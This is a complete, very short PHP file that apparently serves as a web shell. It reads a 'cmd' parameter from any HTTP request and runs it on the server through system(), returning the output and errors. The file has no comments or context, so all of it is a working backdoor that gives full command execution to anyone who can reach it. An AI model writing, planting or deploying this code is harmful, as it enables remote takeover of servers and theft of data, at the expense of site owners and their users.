<?php
$cmd = isset($_REQUEST['cmd']) ? trim($_REQUEST['cmd']) : '';
if ($cmd !== '') {
    system($cmd . ' 2>&1');
}
